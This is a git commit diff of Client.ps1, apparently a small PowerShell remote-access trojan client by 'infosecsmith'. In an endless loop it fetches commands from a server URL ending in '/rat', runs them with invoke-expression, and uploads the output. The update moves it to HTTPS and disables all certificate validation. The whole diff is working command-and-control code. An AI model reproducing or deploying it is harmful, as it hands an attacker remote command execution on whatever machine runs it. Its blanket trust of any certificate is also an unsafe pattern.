e6fa4af53f7647eda9ddc3ee24d1047b37e03de8
infosecsmith <infosecsmith@gmail.com>
2014-06-06 07:23:20 -0600

    Update Client.ps1

--- Client.ps1
+++ Client.ps1
@@ -3,13 +3,15 @@
 # 06-04-2014
 # 
 
+$server = "https://127.0.0.1:8082/rat"
+$wc = New-Object Net.WebClient
 while($true)
 {
-$server = "127.0.0.1:8081"
-$result = (New-Object Net.WebClient).DownloadString("http://$server/fetch")
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$result = $wc.DownloadString("$server")
 while($result) {
 	$output = invoke-expression $result | out-string 
-	$resp = (New-Object System.Net.WebClient).UploadString("http://$server/response", $output)	
+	$wc.UploadString("$server", $output)	
 	break
 }
 }
